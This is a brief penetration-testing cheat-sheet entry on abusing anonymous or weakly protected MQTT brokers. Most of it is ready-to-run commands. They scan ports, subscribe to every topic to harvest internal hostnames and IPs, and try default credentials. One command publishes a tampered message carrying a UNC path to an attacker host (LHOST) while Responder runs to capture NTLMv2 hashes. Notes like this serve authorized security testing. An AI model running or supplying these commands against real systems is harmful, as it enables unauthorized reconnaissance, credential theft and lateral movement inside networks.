# MQTT Anonymous Subscribe/Publish for Lateral Discovery and NTLM Coerce

MQTT brokers often allow anonymous access. Subscribe to `#` (all topics) to discover internal infrastructure announced as messages. Publish a tampered message to coerce authentication.

```bash
# Check for anonymous MQTT:
nmap -p 1883,8883 <TARGET>
mosquitto_sub -h <TARGET> -t '#' -v   # subscribe to all topics

# Common discovery: health check messages containing internal hostnames/IPs
# Example topic: infra/heartbeat -> {"host":"10.0.0.5","service":"backup"}

# Coerce auth: publish a message that causes a service to fetch a UNC path
# (depends on subscriber behavior — if a subscriber processes URLs from messages)
mosquitto_pub -h <TARGET> -t 'infra/config' -m '{"backup_path":"\\\\<LHOST>\\share"}'
sudo responder -I <iface>   # capture NTLMv2 hash from coerced host

# If the broker requires auth but allows weak/default creds:
mosquitto_sub -h <TARGET> -u admin -P admin -t '#' -v
```

Port 8883 = MQTT over TLS; 1883 = plain. Default creds: admin/admin, guest/guest, or blank.
